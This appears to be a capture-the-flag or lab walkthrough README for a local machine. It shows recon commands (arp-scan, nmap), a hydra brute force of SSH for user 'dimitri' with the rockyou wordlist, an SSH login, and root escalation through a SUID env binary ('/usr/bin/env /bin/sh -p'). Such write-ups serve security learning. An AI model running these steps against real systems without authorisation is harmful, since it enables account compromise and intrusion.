<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/d85d1e02-a6f5-4b24-aaa5-caf437e6d01f"></picture></h1>

## **Visualization of our network card**
```bash
ifconfig
```
![image](https://github.com/user-attachments/assets/f33d0347-0390-4371-9536-5b1f2a0558ed)

## **Scanning our network to find connected devices**
```
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/d80884f7-3ad7-40c9-80c1-777115ab4438)

## **Discovering**
```bash
ping -c 192.168.1.220
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.220 -oG allports
nmap -sCV -p22,80 192.168.1.220 -oN targeted
```
![image](https://github.com/user-attachments/assets/df901688-8e24-46e8-b9e5-169d7845111a)

## **PORT 80**
![image](https://github.com/user-attachments/assets/204f1f8b-e815-427e-9c62-c20526874788)

## **PORT 631**
![image](https://github.com/user-attachments/assets/22bb40bd-8097-4ddb-be34-a02d44c94719)

## **Fuzzing Web**
![image](https://github.com/user-attachments/assets/f4e83a33-0334-4246-9a65-858b34a20bf4)
No hidden directories found

## **On the web through port 631 we find a user**
![image](https://github.com/user-attachments/assets/5371ec34-bfb1-44d9-bb44-9e3c123a5d5a)

## **We apply brute force to the SSH service with the found user**
```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.220
```
![image](https://github.com/user-attachments/assets/6db3eaac-d157-4c3f-b565-b93279fb2872)

## **We connect via SSH with the discovered credentials**
```bash
ssh dimitri@192.168.1.220
```
![image](https://github.com/user-attachments/assets/3e914ff8-aebf-4a7d-97b0-0eba0a1051d5)

## **elevating privileges**
```bash
find / -perm -4000 2>/dev/null
```
![image](https://github.com/user-attachments/assets/7f411ad0-4835-4b8b-885a-c761c79b1366)
![image](https://github.com/user-attachments/assets/6261280b-7621-44bb-9f18-d8c5524258e3)

```bash
/usr/bin/env /bin/sh -p
```
![image](https://github.com/user-attachments/assets/60954417-6077-4df9-94c1-a35aa575829e)




